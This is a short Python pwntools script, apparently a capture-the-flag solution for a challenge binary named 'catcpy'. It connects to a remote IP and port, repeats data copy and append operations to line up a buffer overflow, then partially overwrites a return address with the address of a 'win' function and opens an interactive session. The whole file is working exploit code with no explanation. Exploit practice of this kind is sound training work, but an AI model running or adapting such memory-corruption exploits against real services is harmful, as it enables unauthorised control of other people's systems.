from pwn import *

elf = ELF("./catcpy")

p = remote("34.170.146.252", 49654)

for i in range(2):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"Data: ", b"a"*0xff)
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Data: ", b"a"*(0x19+0x4-i))


p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Data: ", b"a"*(0x17+0x4))
p.sendlineafter(b"> ", b"2")

win_addr = elf.symbols["win"]
payload = b"a" * (0x100-0x4) + p32(win_addr)[:3]

p.sendafter(b"Data: ", payload)

p.sendlineafter(b"> ", b"3")

p.interactive()
